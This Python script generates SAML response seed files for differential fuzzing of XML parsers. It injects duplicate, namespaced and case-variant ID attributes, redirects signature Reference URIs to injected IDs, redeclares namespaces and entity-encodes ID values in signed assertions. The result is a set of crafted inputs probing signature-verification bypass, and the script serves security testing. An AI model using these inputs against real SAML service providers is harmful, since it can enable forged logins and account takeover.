#!/usr/bin/env python3
"""Generate attribute pollution seed variants for SAML differential fuzzing.

Targets getAttribute vs getAttributeNS vs XPath @attr divergence across
XML parsers (lxml, xmldom, libxml2 bindings).

Seed categories:
1. Namespace-prefixed ID duplication (saml:ID, ds:ID, xsi:ID, custom:ID)
2. Multiple ID-like attributes (ID, Id, id, xml:id)
3. Attribute ordering variants (evil first vs evil last)
4. Namespace redeclaration on sub-elements
5. Default namespace override affecting attribute resolution
6. Reserved namespace attribute injection (xml:xmlns, xmlns:xml)
7. NameID Format attribute confusion
8. Assertion attribute overload (many attributes)
"""
from __future__ import annotations

import hashlib
import base64
import os
from pathlib import Path
from lxml import etree
from signxml import XMLSigner
from signxml.algorithms import SignatureConstructionMethod, CanonicalizationMethod

KEY_PATH = Path("targets/saml_fixtures/idp_key.pem")
CERT_PATH = Path("targets/saml_fixtures/idp_cert.pem")
OUT_DIR = Path("targets/saml_seeds_attr_pollution")

NSMAP = {
    "samlp": "urn:oasis:names:tc:SAML:2.0:protocol",
    "saml": "urn:oasis:names:tc:SAML:2.0:assertion",
    "ds": "http://www.w3.org/2000/09/xmldsig#",
}


def make_base_response(assert_id="_assert_ap"):
    """Build a minimal valid SAML response with assertion."""
    resp = etree.Element(
        "{urn:oasis:names:tc:SAML:2.0:protocol}Response",
        nsmap={"samlp": NSMAP["samlp"], "saml": NSMAP["saml"]},
    )
    resp.set("ID", "_resp_ap")
    resp.set("Version", "2.0")
    resp.set("IssueInstant", "2026-03-14T10:00:00Z")
    resp.set("Destination", "https://sp.example.com/acs")

    issuer = etree.SubElement(resp, "{urn:oasis:names:tc:SAML:2.0:assertion}Issuer")
    issuer.text = "https://idp.example.com"

    status = etree.SubElement(resp, "{urn:oasis:names:tc:SAML:2.0:protocol}Status")
    sc = etree.SubElement(status, "{urn:oasis:names:tc:SAML:2.0:protocol}StatusCode")
    sc.set("Value", "urn:oasis:names:tc:SAML:2.0:status:Success")

    assertion = etree.SubElement(
        resp, "{urn:oasis:names:tc:SAML:2.0:assertion}Assertion"
    )
    assertion.set("Version", "2.0")
    assertion.set("ID", assert_id)
    assertion.set("IssueInstant", "2026-03-14T10:00:00Z")

    a_issuer = etree.SubElement(
        assertion, "{urn:oasis:names:tc:SAML:2.0:assertion}Issuer"
    )
    a_issuer.text = "https://idp.example.com"

    subject = etree.SubElement(
        assertion, "{urn:oasis:names:tc:SAML:2.0:assertion}Subject"
    )
    nameid = etree.SubElement(
        subject, "{urn:oasis:names:tc:SAML:2.0:assertion}NameID"
    )
    nameid.set("Format", "urn:oasis:names:tc:SAML:1.1:nameid-format:emailAddress")
    nameid.text = "user@example.com"

    sc2 = etree.SubElement(
        subject, "{urn:oasis:names:tc:SAML:2.0:assertion}SubjectConfirmation"
    )
    sc2.set("Method", "urn:oasis:names:tc:SAML:2.0:cm:bearer")
    scd = etree.SubElement(
        sc2, "{urn:oasis:names:tc:SAML:2.0:assertion}SubjectConfirmationData"
    )
    scd.set("NotOnOrAfter", "2026-03-14T11:00:00Z")
    scd.set("Recipient", "https://sp.example.com/acs")

    conditions = etree.SubElement(
        assertion, "{urn:oasis:names:tc:SAML:2.0:assertion}Conditions"
    )
    conditions.set("NotBefore", "2026-03-14T10:00:00Z")
    conditions.set("NotOnOrAfter", "2026-03-14T11:00:00Z")
    ar = etree.SubElement(
        conditions, "{urn:oasis:names:tc:SAML:2.0:assertion}AudienceRestriction"
    )
    aud = etree.SubElement(
        ar, "{urn:oasis:names:tc:SAML:2.0:assertion}Audience"
    )
    aud.text = "https://sp.example.com"

    authn = etree.SubElement(
        assertion, "{urn:oasis:names:tc:SAML:2.0:assertion}AuthnStatement"
    )
    authn.set("AuthnInstant", "2026-03-14T10:00:00Z")
    authn.set("SessionIndex", "_session_ap")
    ac = etree.SubElement(
        authn, "{urn:oasis:names:tc:SAML:2.0:assertion}AuthnContext"
    )
    acr = etree.SubElement(
        ac, "{urn:oasis:names:tc:SAML:2.0:assertion}AuthnContextClassRef"
    )
    acr.text = "urn:oasis:names:tc:SAML:2.0:ac:classes:PasswordProtectedTransport"

    # Add AttributeStatement for attribute confusion tests
    attr_stmt = etree.SubElement(
        assertion, "{urn:oasis:names:tc:SAML:2.0:assertion}AttributeStatement"
    )
    attr_role = etree.SubElement(
        attr_stmt, "{urn:oasis:names:tc:SAML:2.0:assertion}Attribute"
    )
    attr_role.set("Name", "role")
    attr_role.set(
        "NameFormat", "urn:oasis:names:tc:SAML:2.0:attrname-format:basic"
    )
    av = etree.SubElement(
        attr_role, "{urn:oasis:names:tc:SAML:2.0:assertion}AttributeValue"
    )
    av.text = "user"

    return resp, assertion


def sign_assertion(resp):
    """Sign the assertion inside the response."""
    key = KEY_PATH.read_bytes()
    cert = CERT_PATH.read_bytes()
    signer = XMLSigner(
        method=SignatureConstructionMethod.enveloped,
        digest_algorithm="sha256",
        signature_algorithm="rsa-sha256",
        c14n_algorithm=CanonicalizationMethod.EXCLUSIVE_XML_CANONICALIZATION_1_0,
    )
    assertion = resp.find(
        ".//{urn:oasis:names:tc:SAML:2.0:assertion}Assertion"
    )
    signed = signer.sign(assertion, key=key, cert=cert)
    resp.remove(assertion)
    resp.append(signed)
    return resp


def save(xml_bytes: bytes, fname: str):
    path = OUT_DIR / fname
    path.write_bytes(xml_bytes)
    print(f"  {fname} ({len(xml_bytes)} bytes)")


def inject_attr(xml_bytes: bytes, marker: bytes, attr: bytes) -> bytes:
    """Inject attribute before the closing > of an element."""
    idx = xml_bytes.find(marker)
    if idx < 0:
        return xml_bytes
    end = xml_bytes.index(b">", idx)
    return xml_bytes[:end] + b" " + attr + xml_bytes[end:]


def main():
    OUT_DIR.mkdir(parents=True, exist_ok=True)

    can_sign = KEY_PATH.exists()
    if not can_sign:
        print(f"Key not found at {KEY_PATH}, generating unsigned seeds")

    seed_idx = 0

    # ═══════════════════════════════════════════════════════
    # Category 1: Namespace-prefixed ID duplication
    # getAttribute("ID") vs getAttributeNS(null, "ID")
    # ═══════════════════════════════════════════════════════
    prefixed_ids = [
        (b'saml:ID="_evil_saml"', "saml_prefix"),
        (b'samlp:ID="_evil_samlp"', "samlp_prefix"),
        (b'ds:ID="_evil_ds"', "ds_prefix"),
        (b'xsi:ID="_evil_xsi" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"', "xsi_prefix"),
        (b'custom:ID="_evil_custom" xmlns:custom="http://custom.example.com"', "custom_prefix"),
    ]
    for attr, desc in prefixed_ids:
        resp, assertion = make_base_response()
        if can_sign:
            resp = sign_assertion(resp)
        xml = etree.tostring(resp, xml_declaration=True, encoding="UTF-8")
        xml = inject_attr(xml, b"<saml:Assertion ", attr)
        save(xml, f"ap_{seed_idx:03d}_id_dup_{desc}.xml")
        seed_idx += 1

    # Evil ID BEFORE original ID (attribute order matters for some parsers)
    for attr, desc in prefixed_ids[:3]:
        resp, assertion = make_base_response()
        if can_sign:
            resp = sign_assertion(resp)
        xml = etree.tostring(resp, xml_declaration=True, encoding="UTF-8")
        # Insert right after <saml:Assertion (before Version=)
        xml = xml.replace(b"<saml:Assertion ", b"<saml:Assertion " + attr + b" ", 1)
        save(xml, f"ap_{seed_idx:03d}_id_dup_{desc}_first.xml")
        seed_idx += 1

    # ═══════════════════════════════════════════════════════
    # Category 2: Case-variant ID attributes
    # ID vs Id vs id vs xml:id
    # ═══════════════════════════════════════════════════════
    case_ids = [
        (b'Id="_evil_Id"', "Id_case"),
        (b'id="_evil_id"', "id_lower"),
        (b'xml:id="_evil_xmlid"', "xml_id"),
        (b'ID="_evil_dup_same"', "ID_duplicate"),  # same attr name, different value
    ]
    for attr, desc in case_ids:
        resp, assertion = make_base_response()
        if can_sign:
            resp = sign_assertion(resp)
        xml = etree.tostring(resp, xml_declaration=True, encoding="UTF-8")
        xml = inject_attr(xml, b"<saml:Assertion ", attr)
        save(xml, f"ap_{seed_idx:03d}_id_case_{desc}.xml")
        seed_idx += 1

    # ═══════════════════════════════════════════════════════
    # Category 3: Reference URI confusion with polluted ID
    # Signature Reference URI points to evil ID value
    # ═══════════════════════════════════════════════════════
    resp, assertion = make_base_response(assert_id="_assert_ap")
    if can_sign:
        resp = sign_assertion(resp)
    xml = etree.tostring(resp, xml_declaration=True, encoding="UTF-8")
    # Add saml:ID with the SAME value as original ID → which one does getAttr return?
    xml = inject_attr(xml, b"<saml:Assertion ", b'saml:ID="_assert_ap"')
    save(xml, f"ap_{seed_idx:03d}_ref_uri_same_value.xml")
    seed_idx += 1

    # Reference URI points to evil value, original ID intact
    resp, assertion = make_base_response(assert_id="_assert_ap")
    if can_sign:
        resp = sign_assertion(resp)
    xml = etree.tostring(resp, xml_declaration=True, encoding="UTF-8")
    xml = inject_attr(xml, b"<saml:Assertion ", b'saml:ID="_evil_ref"')
    # Change Reference URI to point to evil ID
    xml = xml.replace(b'URI="#_assert_ap"', b'URI="#_evil_ref"')
    save(xml, f"ap_{seed_idx:03d}_ref_uri_evil.xml")
    seed_idx += 1

    # ═══════════════════════════════════════════════════════
    # Category 4: NameID attribute pollution
    # Format attribute confusion via namespaced duplicates
    # ═══════════════════════════════════════════════════════
    nameid_attrs = [
        (b'saml:Format="urn:oasis:names:tc:SAML:1.1:nameid-format:unspecified"', "format_ns_override"),
        (b'Format="urn:oasis:names:tc:SAML:2.0:nameid-format:persistent"', "format_dup"),
        (b'custom:Format="evil" xmlns:custom="http://custom.example.com"', "format_custom_ns"),
    ]
    for attr, desc in nameid_attrs:
        resp, assertion = make_base_response()
        if can_sign:
            resp = sign_assertion(resp)
        xml = etree.tostring(resp, xml_declaration=True, encoding="UTF-8")
        xml = inject_attr(xml, b"<saml:NameID ", attr)
        save(xml, f"ap_{seed_idx:03d}_nameid_{desc}.xml")
        seed_idx += 1

    # ═══════════════════════════════════════════════════════
    # Category 5: Reserved namespace attribute injection
    # xml:xmlns, xmlns:xml — REXML vs libxml2 divergence
    # ═══════════════════════════════════════════════════════
    reserved_attrs = [
        (b'xml:xmlns="http://www.w3.org/2000/09/xmldsig#"', "xml_xmlns_ds", b"<saml:Assertion "),
        (b'xml:xmlns="urn:oasis:names:tc:SAML:2.0:assertion"', "xml_xmlns_saml", b"<saml:Assertion "),
        (b'xmlns:xml="http://www.w3.org/XML/1998/namespace"', "xmlns_xml_redecl", b"<saml:Assertion "),
        (b'xml:xmlns="#"', "xml_xmlns_fragment", b"<saml:Assertion "),
        # On Signature element
        (b'xml:xmlns="http://www.w3.org/2000/09/xmldsig#"', "xml_xmlns_on_sig", b"<ds:Signature "),
    ]
    for attr, desc, target in reserved_attrs:
        resp, assertion = make_base_response()
        if can_sign:
            resp = sign_assertion(resp)
        xml = etree.tostring(resp, xml_declaration=True, encoding="UTF-8")
        xml = inject_attr(xml, target, attr)
        save(xml, f"ap_{seed_idx:03d}_reserved_{desc}.xml")
        seed_idx += 1

    # ═══════════════════════════════════════════════════════
    # Category 6: Namespace redeclaration on sub-elements
    # Redefine saml: or ds: prefix on child elements
    # ═══════════════════════════════════════════════════════
    ns_redecl = [
        # Redefine saml prefix on Subject → NameID lookup confusion
        (b"<saml:Subject>", b'<saml:Subject xmlns:saml="http://evil.example.com/saml">', "subject_saml_redefine"),
        # Redefine ds prefix on Signature → sig verification confusion
        (b"<ds:Signature ", b'<ds:Signature xmlns:ds="http://evil.example.com/ds" ', "sig_ds_redefine"),
        # Add default namespace on NameID
        (b"<saml:NameID ", b'<saml:NameID xmlns="http://evil.example.com" ', "nameid_default_ns"),
        # Redefine saml to actual ds namespace (cross-wire)
        (b"<saml:Subject>", b'<saml:Subject xmlns:saml="http://www.w3.org/2000/09/xmldsig#">', "subject_saml_to_ds"),
    ]
    for old, new, desc in ns_redecl:
        resp, assertion = make_base_response()
        if can_sign:
            resp = sign_assertion(resp)
        xml = etree.tostring(resp, xml_declaration=True, encoding="UTF-8")
        xml = xml.replace(old, new, 1)
        save(xml, f"ap_{seed_idx:03d}_nsredecl_{desc}.xml")
        seed_idx += 1

    # ═══════════════════════════════════════════════════════
    # Category 7: Attribute value encoding variants
    # Entity-encoded attribute values
    # ═══════════════════════════════════════════════════════
    encoding_variants = [
        # ID value with entity encoding
        (b'ID="_assert_ap"', b'ID="_assert&#x5f;ap"', "id_entity_hex"),
        (b'ID="_assert_ap"', b'ID="_assert&#95;ap"', "id_entity_dec"),
        # ID with leading/trailing whitespace
        (b'ID="_assert_ap"', b'ID=" _assert_ap "', "id_whitespace"),
        (b'ID="_assert_ap"', b'ID="_assert_ap\t"', "id_tab"),
    ]
    for old, new, desc in encoding_variants:
        resp, assertion = make_base_response()
        if can_sign:
            resp = sign_assertion(resp)
        xml = etree.tostring(resp, xml_declaration=True, encoding="UTF-8")
        xml = xml.replace(old, new, 1)
        save(xml, f"ap_{seed_idx:03d}_encoding_{desc}.xml")
        seed_idx += 1

    # ═══════════════════════════════════════════════════════
    # Category 8: Multiple attributes stress test
    # Many namespaced attributes on Assertion
    # ═══════════════════════════════════════════════════════
    resp, assertion = make_base_response()
    if can_sign:
        resp = sign_assertion(resp)
    xml = etree.tostring(resp, xml_declaration=True, encoding="UTF-8")
    multi_attrs = (
        b'saml:ID="_e1" samlp:ID="_e2" ds:ID="_e3" '
        b'Id="_e4" id="_e5" xml:id="_e6" '
        b'xmlns:custom="http://c.example.com" custom:ID="_e7"'
    )
    xml = inject_attr(xml, b"<saml:Assertion ", multi_attrs)
    save(xml, f"ap_{seed_idx:03d}_multi_id_overload.xml")
    seed_idx += 1

    # Variant: evil IDs all with same value as original
    resp, assertion = make_base_response()
    if can_sign:
        resp = sign_assertion(resp)
    xml = etree.tostring(resp, xml_declaration=True, encoding="UTF-8")
    same_val_attrs = (
        b'saml:ID="_assert_ap" samlp:ID="_assert_ap" '
        b'Id="_assert_ap" xml:id="_assert_ap"'
    )
    xml = inject_attr(xml, b"<saml:Assertion ", same_val_attrs)
    save(xml, f"ap_{seed_idx:03d}_multi_id_same_value.xml")
    seed_idx += 1

    print(f"\nGenerated {seed_idx} attribute pollution seeds in {OUT_DIR}")


if __name__ == "__main__":
    main()
